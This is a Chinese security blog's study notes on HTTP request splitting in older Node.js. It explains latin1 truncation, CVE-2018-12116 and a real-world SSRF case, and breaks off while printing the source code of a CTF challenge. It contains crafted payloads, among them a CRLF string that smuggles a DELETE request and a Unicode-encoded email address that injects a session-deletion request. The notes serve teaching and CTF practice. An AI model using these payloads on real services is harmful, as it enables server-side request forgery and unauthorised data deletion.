<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>AmiaaaZ's Site | HTTP请求切分攻击学习笔记</title><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=generator content="Hugo 0.108.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link href=/dist/app.css rel=stylesheet><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-203328343-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script>
<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous><script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><script>(function(e,t){var s=document,o="script",n=s.createElement(o),i=s.getElementsByTagName(o)[0];n.src=e,t&&n.addEventListener("load",function(e){t(e)}),i.parentNode.insertBefore(n,i)})("https://amiaaaz.github.io/lib/pangu.min.js",function(){pangu.spacingPage()})</script><style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style></head><body class="bg-gray-100 text-gray-700 font-sans"><div class="p-6 sm:p-10 md:p-16 flex flex-wrap"><header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl"><div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2"><div><h2><a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a></h2></div><h1 class=pt-2>HTTP请求切分攻击学习笔记</h1><h3 class="text-java-700 font-normal leading-relaxed pt-2">用心整理学习了属于是，算是有了比较深刻的认识（并不</h3><div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light"><a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/notessummary>NOTES&SUMMARY</a>
&nbsp;&nbsp;
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/ssrf>SSRF</a>&nbsp;/
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/node.js>Node.js</a></div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2021-12-07T02:24:15+08:00>2021-12-7 02:24</time></div><details class=toc open><summary><hr></summary><div class="inline toc-content"><nav id=TableOfContents><ul><li><a href=#nodejs-http请求路径中的unicode字符损坏>Node.js: http请求路径中的unicode字符损坏</a></li><li><a href=#http-request-splitting>HTTP Request Splitting</a></li><li><a href=#ssrf-via-request-splitting--cve-2018-12116>SSRF via Request Splitting / cve-2018-12116</a><ul><li><a href=#真实场景下的案例>真实场景下的案例</a></li></ul></li><li><a href=#asisctf-final-2018proxy-proxy>[ASISCTF final 2018]Proxy-Proxy</a></li><li><a href=#安洵杯-2019membershop>[安洵杯 2019]Membershop</a></li><li><a href=#nullcon-hackim2020split-second>[nullcon HackIM2020]Split second</a></li><li><a href=#gyctf2020node-game>[GYCTF2020]Node Game</a></li></ul></nav></div></details><hr></div></header><main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4"><article><section class="mx-auto content"><div class=c-rich-text><p>说到与HTTP请求有关的攻击方式能想到什么？</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205111212810.png alt=image-20211205111212810></p><p><del>是不是一下子恍然大明白了</del></p><p>这一篇就是其中HTTP Request Splitting的学习笔记，长期更新；其它模块的也会随后更新~</p><p>老规矩，所有的参考链接&docker链接放到文末</p><h2 id=nodejs-http请求路径中的unicode字符损坏>Node.js: http请求路径中的unicode字符损坏</h2><blockquote><p>使用Node.js向特定路径发出http请求，但是却被定向到了不一样的路径</p></blockquote><p>虽然用户发出的http请求通常是个字符串string，但Node.js最终必须将请求以原始字节raw bytes输出，js支持unicode，这其中涉及到了unicode编码转换。对于不包含body的请求，Node.js默认使用<code>latin1</code>，它是单字节编码，不能表示高编号的unicode字符，比如emoji 🐶</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>v</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;/caf\u{E9}\u{01F436}&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>v</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>w</span> <span style=color:#f92672>=</span> <span style=color:#75af00>Buffer</span><span style=color:#111>.</span><span style=color:#75af00>from</span><span style=color:#111>(</span><span style=color:#75af00>v</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;latin1&#39;</span><span style=color:#111>).</span><span style=color:#75af00>toString</span><span style=color:#111>(</span><span style=color:#d88200>&#39;latin1&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>w</span><span style=color:#111>)</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103409976.png alt=image-20211205103409976></p><p>两字节的unicode编码用<code>latin1</code>转换为单字节时会被截去开头的第一个字节</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>Buffer</span><span style=color:#111>.</span><span style=color:#75af00>from</span><span style=color:#111>(</span><span style=color:#d88200>&#39;\u{5b}&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;latin1&#39;</span><span style=color:#111>).</span><span style=color:#75af00>toString</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>Buffer</span><span style=color:#111>.</span><span style=color:#75af00>from</span><span style=color:#111>(</span><span style=color:#d88200>&#39;\u{015b}&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;latin1&#39;</span><span style=color:#111>).</span><span style=color:#75af00>toString</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>Buffer</span><span style=color:#111>.</span><span style=color:#75af00>from</span><span style=color:#111>(</span><span style=color:#d88200>&#39;\u{0128}&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;latin1&#39;</span><span style=color:#111>).</span><span style=color:#75af00>toString</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>Buffer</span><span style=color:#111>.</span><span style=color:#75af00>from</span><span style=color:#111>(</span><span style=color:#d88200>&#39;\u{28}&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;latin1&#39;</span><span style=color:#111>).</span><span style=color:#75af00>toString</span><span style=color:#111>())</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103625305.png alt=image-20211205103625305></p><hr><p>那这个Node.js的安全问题跟SSRF又是怎么联系到一起的呢？处理用户输入时出现了数据损坏是个明显的危险信号</p><h2 id=http-request-splitting>HTTP Request Splitting</h2><blockquote><p><em>This entails the adversary injecting malicious user input into various standard and/or user defined HTTP headers within a HTTP Request through user input of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters and unique character encoding. This malicious user input allows for web script to be injected in HTTP headers as well as into browser cookies or Ajax web/browser object parameters like XMLHttpRequest during implementation of asynchronous requests.</em></p></blockquote><p>通俗来说，就是原本1个请求对应1次响应，现在我们对请求的body部分再添加1个请求，导致看似发送了1次请求实则会被解释为2个响应被加载出来，会造成XSS和SSRF</p><p>举一个简单的小栗子：一般的请求形式是这样的</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#75af00>GET</span> <span style=color:#111>/private-api?q=&lt;user-input-here&gt;</span> <span style=color:#00a8c8>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span></code></pre></div><p>但是我们构造了这样的用户输入</p><pre tabindex=0><code>x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n
</code></pre><p>当请求发出后，服务端将会收到这样的请求</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#75af00>GET</span> <span style=color:#111>/private-api?q=x</span> <span style=color:#00a8c8>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>DELETE /private-api HTTP/1.1
</span></span></code></pre></div><p>包含了两个请求方式，如果服务端没有设置特殊的过滤则可能会将两个请求全部执行并回显；而如果第二个额外的请求包含一些只有服务端本地才能访问到的内容，则会造成SSRF(Server-Side Request Forgery)</p><h2 id=ssrf-via-request-splitting--cve-2018-12116>SSRF via Request Splitting / cve-2018-12116</h2><p>正如上面栗子展示的那样，不过一般http库都会对这种行为做出防范；Node.js也不例外，比如</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>http</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http://gqa6995cu69dkt0oxvzzzwzt0k6auz.burpcollaborator.net/\r\n/test&#39;</span><span style=color:#111>)</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160107403.png alt=image-20211205160107403></p><p>换成unicode呢？画风开始奇怪了</p><pre tabindex=0><code>&#39;http://example.com/\u{010D}\u{010A}/test&#39;
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160205490.png alt=image-20211205160205490></p><p>上面我们提过的unicode截去开头第一个字节的事情，我们就可以构造<code>\r\n</code>了</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>Buffer</span><span style=color:#111>.</span><span style=color:#75af00>from</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http://example.com/\u{010D}\u{010A}/test&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;latin1&#39;</span><span style=color:#111>).</span><span style=color:#75af00>toString</span><span style=color:#111>()</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205164009244.png alt=image-20211205164009244></p><p>当Node.js&lt;=8构造对这样的url请求时，由于他们不是HTTP控制字符所以不会修改，原样输出；而结合上面我们提过的unicode截去开头第一个字节的事情，我们就可以构造<code>\r\n</code>的CRLFi了</p><p>现在的Node.js均已修复此问题，官方修复-><a href=https://github.com/nodejs/node/commit/dd20c0186f>http: add &ndash;security-revert for CVE-2018-12116</a></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163601837.png alt=image-20211205163601837></p><p>旧版中会直接对解释不了的unicode报错，而不是尝试原封不动的搬过去请求</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163703908.png alt=image-20211205163703908></p><h3 id=真实场景下的案例>真实场景下的案例</h3><p>来自-><a href=https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/>Security Bugs in Practice: SSRF via Request Splitting</a> 强烈建议看原文</p><p>火狐邮箱账号的客户端与服务器后端交互流程是这样的</p><pre tabindex=0><code> +--------+        +--------+        +-----------+       +----------+
 | Client |  HTTP  |  API   |  HTTP  | DataStore |  SQL  |   MySQL  |
 |        |&lt;------&gt;| Server |&lt;------&gt;|  Service  |&lt;-----&gt;| Database |
 +--------+        +--------+        +-----------+       +----------+
</code></pre><p>客户端发出的请求是通过http与API Server交互的，比如一个这样的请求</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>GET /email/74657374406578616d706c652e636f6d
</span></span></span></code></pre></div><p>会得到<code>test@example.com</code>的邮件记录，用hex做了请求的路由，但是一个删除操作却是直接拼接字符串</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>DELETE /account/xyz/emails/test@example.com
</span></span></span></code></pre></div><p>此时，最后的端点可控，结合上面的bug，当我们注册这样一个账号</p><pre tabindex=0><code>x@̠ňƆƆɐį1̮1č̊č̊ɆͅƆ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňƆƆɐį1̮1č̊č̊.cc
</code></pre><p>它其实是这样</p><pre tabindex=0><code>v = &#39;x@̠ňƆƆɐį1̮1č̊č̊ɆͅƆ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňƆƆɐį1̮1č̊č̊.cc&#39;
Buffer.from(v.toLowerCase(), &#34;latin1&#34;).toString()
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205205928287.png alt=image-20211205205928287></p><p><del>真是Node.js的美妙特性</del></p><p>对这样一个账号再次进行DELETE请求时则会这样</p><pre tabindex=0><code>console.log(Buffer.from(&#39;DELETE /account/f9f9eebb05ef4b819b0467cc5ddd3b4a/email/x@̠ňɔɔɐį1̮1č̊č̊ɇͅɔ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňɔɔɐį1̮1č̊č̊.cc&#39;, &#39;latin1&#39;).toString())
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210133004.png alt=image-20211205210133004></p><p>SSRF来了</p><h2 id=asisctf-final-2018proxy-proxy>[ASISCTF final 2018]Proxy-Proxy</h2><p>简单审了一下代码，标记到注释中了</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>fs</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;fs&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>path</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;path&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>body_parser</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;body-parser&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>md5</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;md5&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>http</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>ip</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#34;ip&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;x-date&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>server_ip</span> <span style=color:#f92672>=</span> <span style=color:#75af00>ip</span><span style=color:#111>.</span><span style=color:#75af00>address</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>server</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>body_parser</span><span style=color:#111>.</span><span style=color:#75af00>urlencoded</span><span style=color:#111>({</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>extended</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>true</span>
</span></span><span style=display:flex><span><span style=color:#111>}));</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>express</span><span style=color:#111>.</span><span style=color:#00a8c8>static</span><span style=color:#111>(</span><span style=color:#d88200>&#39;public&#39;</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#d88200>&#39;views&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>path</span><span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span><span style=color:#75af00>__dirname</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;views&#39;</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#d88200>&#39;view engine&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;jade&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#ae81ff>5000</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>request</span><span style=color:#111>,</span> <span style=color:#75af00>result</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;index&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>check_endpoint</span><span style=color:#111>(</span><span style=color:#75af00>available_endpoints</span><span style=color:#111>,</span> <span style=color:#75af00>endpoint</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>for</span> <span style=color:#111>(</span><span style=color:#75af00>i</span> <span style=color:#00a8c8>of</span> <span style=color:#75af00>available_endpoints</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>endpoint</span><span style=color:#111>.</span><span style=color:#75af00>indexOf</span><span style=color:#111>(</span><span style=color:#75af00>i</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>true</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>false</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>readFile</span><span style=color:#111>(</span><span style=color:#d88200>&#39;flag.dat&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;utf8&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>,</span> <span style=color:#75af00>contents</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>throw</span> <span style=color:#75af00>err</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>flag</span> <span style=color:#f92672>=</span> <span style=color:#75af00>contents</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/proxy/internal_website/:page&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>request</span><span style=color:#111>,</span> <span style=color:#75af00>result</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>available_endpoints</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#39;public_notes&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;public_links&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;source_code&#39;</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>page</span> <span style=color:#f92672>=</span> <span style=color:#75af00>request</span><span style=color:#111>.</span><span style=color:#75af00>params</span><span style=color:#111>.</span><span style=color:#75af00>page</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>setHeader</span><span style=color:#111>(</span><span style=color:#d88200>&#39;X-Node-js-Version&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;v8.12.0&#39;</span><span style=color:#111>)</span>	<span style=color:#75715e>// 版本提示
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>setHeader</span><span style=color:#111>(</span><span style=color:#d88200>&#39;X-Express-Version&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;v4.16.3&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>toLowerCase</span><span style=color:#111>().</span><span style=color:#75af00>includes</span><span style=color:#111>(</span><span style=color:#d88200>&#39;flag&#39;</span><span style=color:#111>))</span> <span style=color:#111>{</span>  <span style=color:#75715e>// 先转小写再判断 不能有flag
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>sendStatus</span><span style=color:#111>(</span><span style=color:#ae81ff>403</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>check_endpoint</span><span style=color:#111>(</span><span style=color:#75af00>available_endpoints</span><span style=color:#111>,</span> <span style=color:#75af00>page</span><span style=color:#111>))</span> <span style=color:#111>{</span>    <span style=color:#75715e>// 白名单审查
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;available_endpoints&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>endpoints</span><span style=color:#f92672>:</span> <span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>stringify</span><span style=color:#111>(</span><span style=color:#75af00>available_endpoints</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#111>})</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>result</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http://127.0.0.1:5000/&#39;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>page</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>setEncoding</span><span style=color:#111>(</span><span style=color:#d88200>&#39;utf8&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>statusCode</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>on</span><span style=color:#111>(</span><span style=color:#d88200>&#39;data&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>chunk</span><span style=color:#111>)</span> <span style=color:#111>{</span>
